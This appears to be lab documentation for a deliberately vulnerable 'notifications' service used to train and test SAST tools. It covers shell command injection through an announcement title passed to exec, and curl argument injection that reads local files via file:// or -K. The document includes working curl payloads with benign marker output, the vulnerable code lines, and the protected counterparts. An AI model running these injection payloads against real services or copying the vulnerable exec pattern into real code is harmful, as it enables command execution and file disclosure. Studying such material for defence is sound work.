# `OS` — the caller's string on a command line

**Family:** `OS` · **Service:** `notifications` · **Scanner:** SAST · **OWASP:** A03

Two operations reach for a process: the announcement send builds the
notifier's command line by interpolation, and the webhook ping hands its URL
to `curl` as an argument. Both put a caller's string where the shell or the
tool reads it as syntax, not data.

| ID | The operation | The sink | CWE |
| --- | --- | --- | --- |
| OS-001 | `POST /internal/announcements/send` | `exec` of a command line with the title in it | CWE-78 |
| OS-002 | `pingWebhook(url: String!)` | `execFile('curl', [url])` | CWE-88 |

## OS-001 — a title that reaches a shell

### OS-001 — agent reference

- **Scenario:** OS-001, a title interpolated into a shell command.
- **Source:** `apps/notifications/src/announcements/announcements-send.controller.ts`
- **Operation:** `POST /internal/announcements/send` (gateway: `POST /api/v1/admin/announcements/send`), REST, administrator.
- **Sink:** `exec` of `` node scripts/notify.js --title "${title}" --body "${rendered}" --url "${url}" ``.
- **Flow:** `body.title → AnnouncementsSendController.send → exec(command) → /bin/sh -c`.
- **Counterparts:** `apps/notifications/src/announcements/broadcast-announcement.resolver.ts` (`execFile` with a fixed argument vector), `apps/notifications/src/announcements/announcements-notify.controller.ts` (a function call, no process).
- **Tests:** `apps/notifications/test/scenarios/os.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report caller input interpolated into a command passed to `exec`.

### OS-001 — student guide

The line (`apps/notifications/src/announcements/announcements-send.controller.ts`):

```ts
const command = `node scripts/notify.js --title "${input.title}" --body "${rendered}" --url "${url}"`; // OS-001 / CWE-78: the title is interpolated into a command line the shell reads
```

`exec` runs its string through `/bin/sh -c`, and the double quotes around
the title are *shell* syntax, not string syntax: they are data in JavaScript
and syntax to the shell. A title that closes the quote ends the `node`
command, and everything after the `;` is a command of the caller's choosing.
What the command prints on stdout is stored as the delivery's
`responseBody`, so the caller reads the result of the command they planted.

The author's belief: "the title is quoted, and it is an administrator's
field anyway." The quote is exactly what the payload turns into a door, and
an administrator's field is still caller input: any string that can hold a
`"` can close the quoting.

### OS-001 — exploit lab

Run on 2026-11-27 against the service alone on `127.0.0.1:3103`, with an
administrator's token in `$T` and Alice's in `$A`. The payload is the title
`Maintenance"; echo zazzles-lab-marker; echo "`.

```console
$ curl -s http://127.0.0.1:3103/internal/announcements/send -H "authorization: Bearer $T" \
    -H 'content-type: application/json' \
    -d '{"title":"Maintenance\"; echo zazzles-lab-marker; echo \"","body":"Scheduled maintenance at 02:00 UTC."}'
{"announcement":{"id":2,"title":"Maintenance\"; echo zazzles-lab-marker; echo \"", …}}

$ curl -s http://127.0.0.1:3103/internal/deliveries -H "authorization: Bearer $A"
…
  "status": "DELIVERED",
  "responseBody": "Maintenance\n\n\n→ \nzazzles-lab-marker\n --body Scheduled maintenance at 02:00 UTC. …",
```

`zazzles-lab-marker` stands on its own line in the record: the `echo` the
caller planted in the title ran, and its output came back through the
delivery record. In Postman: the request `OS-001: a title that reaches a
shell` in the notifications collection. In Burp: send the same POST to the
gateway's `/api/v1/admin/announcements/send` from Repeater, then read the
last delivery.

### OS-001 — vulnerable and protected

| | Operation | What it does with the same title |
| --- | --- | --- |
| Vulnerable | `POST /internal/announcements/send` | Interpolates it into a command line and runs it through the shell |
| Counterpart 1 | `broadcastAnnouncement(input)` | `execFile(process.execPath, [script, '--title', title, …])`: the title is one argument of a fixed vector, and the record holds it as one line |
| Counterpart 2 | `POST /internal/announcements/notify` | No process at all: the notice is built in process and sent by the HTTP client |

**Scoped claim.** Each counterpart defeats this flaw for identical input: a
title that closes a quote and plants a command is, for them, an inert string
— one argument in the first, JSON data in the second, as the receiver's log
shows (`{"title":"Maintenance\"; echo zazzles-lab-marker; echo \"", …}`).
Neither claim is wider: neither says anything about other fields or other
routes to a process.

### OS-001 — tests

`apps/notifications/test/scenarios/os.int-spec.ts`, describe `OS-001: a
title that reaches a shell`. One attacker value — the title with the `echo`
hidden in its quote — is sent to all three operations:

- **The exploit:** the route answers `201`, and Alice's delivery record is
  `DELIVERED` with a `responseBody` line that is exactly `zazzles-lab-marker`.
- **Counterpart 1:** `broadcastAnnouncement` answers with the title as
  stored; the record holds the title as one line and no line is the marker.
- **Counterpart 2:** the receiver on 4010 is sent the title as JSON data,
  the record holds the receiver's answer (`{"received":true}`), and no line
  is the marker.

## OS-002 — an option where a URL was expected

### OS-002 — agent reference

- **Scenario:** OS-002, a caller URL passed to `curl` as an argument.
- **Source:** `apps/notifications/src/webhooks/ping-webhook.resolver.ts`
- **Operation:** `pingWebhook(url: String!)`, GraphQL, any user.
- **Sink:** `execFile('curl', [url])`.
- **Flow:** `args.url → PingWebhookResolver.ping → execFile('curl', [url]) → curl reads the argument as its own: a file:// URL returns a local file`.
- **Counterparts:** `apps/notifications/src/webhooks/preview-webhook.resolver.ts` (an HTTP client, no `curl`), `apps/notifications/src/webhooks/webhooks-test.controller.ts` (the outbound guard refuses the URL before anything could start).
- **Tests:** `apps/notifications/test/scenarios/os.int-spec.ts`.
- **Expected finding:** yes. A SAST tool must report caller input passed as a command argument where a leading dash makes it an option.

### OS-002 — student guide

The line (`apps/notifications/src/webhooks/ping-webhook.resolver.ts`):

```ts
const { stdout } = await runFile('curl', [
  url, // OS-002 / CWE-88: the caller's string is passed to curl as its one argument, so a leading dash makes it an option
]);
```

`execFile` skips the shell, so there is no injection into a command *line* —
but the argument is still curl's to read, and a URL is only one of the
things it can name. A `file://` URL makes curl read a local file and print
it, exactly as it would fetch an HTTP page; an argument that begins with `-`
is not a URL to curl at all but an option (`-K<file>`, short for
`--config`, tells it to read its configuration from a path the caller
names). Whatever curl prints — the fetched file on stdout, its complaints on
stderr — the delivery record keeps, so the caller reads it back.

The author's belief: "`execFile` is the safe one — no shell, no injection."
True for the shell; false for the tool. The argument vector is only as fixed
as the values in it, and the service decided on none of them.

### OS-002 — exploit lab

Run on 2026-11-27 against the service alone on `127.0.0.1:3103`, with
Alice's token in `$A`. The payload is `file:///tmp/vcx-marker.conf`, a
one-line file the caller wrote (`zazzles-lab-marker`) before the request:
one argument, which every curl takes.

```console
$ curl -s http://127.0.0.1:3103/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"mutation($url: String!) { pingWebhook(url: $url) { url status attempts } }",
         "variables":{"url":"file:///tmp/vcx-marker.conf"}}'
{"data":{"pingWebhook":{"url":"file:///tmp/vcx-marker.conf","status":"DELIVERED","attempts":1}}}

$ curl -s http://127.0.0.1:3103/internal/deliveries -H "authorization: Bearer $A"
…
  "status": "DELIVERED",
  "responseBody": "zazzles-lab-marker\n",
```

The file's own line came back in the record: curl read a file at a path the
caller chose, because nothing decided the argument was a URL at all. (On a
curl that reads `-K<file>` — this machine's 8.7.1 does — the option form
works too, the file's lines coming back in `lastError`; the `file://` form
holds everywhere.) In Postman: the request `OS-002: an option where a URL
was expected`, whose payload is `-h` — curl prints its own usage instead of
asking for any URL, which is the same fact seen without a filesystem. In
Burp: send the mutation from Repeater and read the record.

### OS-002 — vulnerable and protected

| | Operation | What it does with the same value |
| --- | --- | --- |
| Vulnerable | `pingWebhook(url)` | Gives it to `curl` as its one argument; curl reads it as it reads any argument — here, a `file://` URL, and the file's content comes back in the record |
| Counterpart 1 | `previewWebhook(url)` | No process: the HTTP client asks the outbound guard first, which refuses — `the scheme file is not http or https` |
| Counterpart 2 | `POST /internal/webhooks/test` | The same refusal, recorded: the delivery is `FAILED` with the guard's reason, and nothing is sent |

**Scoped claim.** Each counterpart defeats this flaw for identical input:
neither starts a process, and both decide on the value before anything could
run — the guard's `the scheme file is not http or https` is the refusal for
exactly this value. The claim is not that the guard makes every URL safe;
only that this value never reaches a tool that would read it as curl does.

### OS-002 — tests

`apps/notifications/test/scenarios/os.int-spec.ts`, describe `OS-002: an
option where a URL was expected`. One attacker value — `file://<file>`, a
file the test creates under its own temporary directory holding
`zazzles-lab-marker` — is sent to all three operations:

- **The exploit:** `pingWebhook` answers `DELIVERED` with `attempts` 1, and
  the record's `responseBody` is `zazzles-lab-marker`: the file the caller
  named was read and its line returned.
- **Counterpart 1:** `previewWebhook` answers `FAILED` with `the scheme
  file is not http or https`.
- **Counterpart 2:** `POST /internal/webhooks/test` answers `200` with the
  recorded refusal — status `FAILED`, the same reason — and nothing is sent.

The temporary directory is removed in `afterAll`: nothing of the test
remains.
